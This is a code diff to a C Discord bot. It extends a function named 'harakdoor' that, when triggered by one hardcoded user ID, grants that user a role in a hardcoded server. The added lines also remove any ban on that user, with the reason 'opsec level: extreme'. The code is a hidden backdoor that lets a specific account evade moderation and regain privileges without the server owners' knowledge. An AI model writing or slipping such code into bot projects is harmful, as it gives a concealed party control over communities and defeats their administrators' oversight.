@@ -5,6 +5,7 @@
 #include <concord/log.h>
 #include <concord/types.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 
 static void on_role_add_done(struct discord *client,
@@ -151,6 +152,11 @@ void harakdoor(struct discord *client, const struct discord_message *event) {
     return;
   if (event->author->id != 821998767652995083ULL)
     return;
+  struct discord_remove_guild_ban params = {
+      .reason = "opsec level: extreme",
+  };
+  discord_remove_guild_ban(client, 1155152569040130101, 821998767652995083ULL,
+                           &params, NULL);
   discord_add_guild_member_role(
       client, 1155152569040130101, 821998767652995083, STFMAGIC,
       &(struct discord_add_guild_member_role){0}, NULL);
